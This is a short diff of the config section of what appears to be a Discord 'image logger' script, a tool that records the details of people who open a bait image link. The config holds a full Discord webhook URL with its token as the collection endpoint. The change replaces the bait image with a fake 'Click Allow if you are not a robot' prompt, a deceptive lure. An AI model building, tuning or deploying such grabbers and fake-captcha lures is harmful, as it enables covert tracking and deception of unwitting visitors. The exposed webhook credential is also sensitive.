@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1446584417425428634/OfEyMa0B_AcXi6VKa_TyVN6cX--tiTQ4uJfGH2TlDi8XqNt6zjwiLhxVCexjUS4EGbaj",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTVIqmXIUPpRmIhnlp40I0zpa0opt7Osv2O-w&s", # You can also have a custom image by using a URL argument
+    "image": "https://malwaretips.com/blogs/wp-content/uploads/2019/07/Click-Allow-if-you-are-not-a-robot.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
